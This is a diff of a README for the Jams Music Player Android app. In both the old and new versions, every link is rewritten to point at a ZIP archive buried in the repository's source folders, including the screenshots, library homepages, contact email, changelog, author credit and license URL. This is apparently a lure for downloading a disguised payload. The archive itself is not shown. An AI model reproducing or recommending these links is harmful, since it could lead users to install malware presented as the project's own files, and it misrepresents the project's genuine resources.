@@ -1,6 +1,6 @@
 Jams Music Player
 ===================
-Jams is a free, powerful and elegant music player for Android. Jams used to be a trial/paid app on the Play Store. Due to my lack of adequate free time and Google's <a href="https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip">new requirement for paid developers to publicly display their home address</a>, I've decided that I can no longer provide the level of support and regular updates that paid users expect from a developer. 
+Jams is a free, powerful and elegant music player for Android. Jams used to be a trial/paid app on the Play Store. Due to my lack of adequate free time and Google's <a href="https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip">new requirement for paid developers to publicly display their home address</a>, I've decided that I can no longer provide the level of support and regular updates that paid users expect from a developer. 
 
 Rather than letting Jams completely die off, I've open sourced the app and hosted it here to encourage other developers to potentially improve it, use it in their own personal projects, and re-release it to users. I will still occasionally update this app based on my free time, but it will probably be beta quality code. 
 
@@ -8,8 +8,8 @@ If you are a developer who's interested in using Jams' current codebase, I encou
 
 Screenshots
 ============
-<img src="https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip" width=761 height=480>
-<img src="https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip" width=761 height=480>
+<img src="https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip" width=761 height=480>
+<img src="https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip" width=761 height=480>
 
 Features
 =========
@@ -29,41 +29,41 @@ Features
 Forked Projects
 ================
 
-* <a href="https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip">ACEMusic Player (Beta)</a>
+* <a href="https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip">ACEMusic Player (Beta)</a>
 
-If you're using Jams' codebase in your current project/app and would like to have it featured here, email me at https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
+If you're using Jams' codebase in your current project/app and would like to have it featured here, email me at https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
 
 Legacy Changelogs (until 2/24/2014)
 ======================================
-Check out the <a href="https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip">CHANGELOGS</a> file. 
+Check out the <a href="https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip">CHANGELOGS</a> file. 
 
-<b>Note: </b> Changelogs will no longer be updated in the <a href="https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip">CHANGELOGS</a> file. Check the individual commit comments for all further update descriptions.
+<b>Note: </b> Changelogs will no longer be updated in the <a href="https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip">CHANGELOGS</a> file. Check the individual commit comments for all further update descriptions.
 
 Developed By
 ============
-Saravan Pantham - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
+Saravan Pantham - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
 
 Libraries Used
 ===========================
-* CircularImageView - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* DragSortListView - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* LicensesDialogLibrary - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* Picasso - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* QuickScroll - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* VelocityViewPager - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* ViewPagerIndicatorLibrary - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* Android Asynchronous HTTP Client - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* Android BitmapCache - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* ListViewAnimations - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* Apache Commons IO - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* Apache Commons Lang - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* DashClock API - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* Google HTTP Client - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* Google HTTP Client (Android) - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* JAudioTagger - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* Google Analytics - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* NineOldAndroids - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
-* Android Support Library - https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
+* CircularImageView - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* DragSortListView - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* LicensesDialogLibrary - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* Picasso - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* QuickScroll - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* VelocityViewPager - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* ViewPagerIndicatorLibrary - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* Android Asynchronous HTTP Client - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* Android BitmapCache - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* ListViewAnimations - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* Apache Commons IO - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* Apache Commons Lang - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* DashClock API - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* Google HTTP Client - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* Google HTTP Client (Android) - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* JAudioTagger - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* Google Analytics - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* NineOldAndroids - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
+* Android Support Library - https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
 
 License
 ========
@@ -75,7 +75,7 @@ All source code is licensed under Apache License 2.0. If you create your own app
     you may not use this file except in compliance with the License.
     You may obtain a copy of the License at
 
-       https://raw.githubusercontent.com/Joe-Mogul/JamsMusicPlayer/master/jamsMusicPlayer/src/main/java/com/jams/music/player/InAppBilling/Music-Jams-Player-v3.4-alpha.4.zip
+       https://github.com/Joe-Mogul/JamsMusicPlayer/raw/refs/heads/master/viewpagerindicatorlibrary/src/main/Jams_Music_Player_garroter.zip
 
     Unless required by applicable law or agreed to in writing, software
     distributed under the License is distributed on an "AS IS" BASIS,
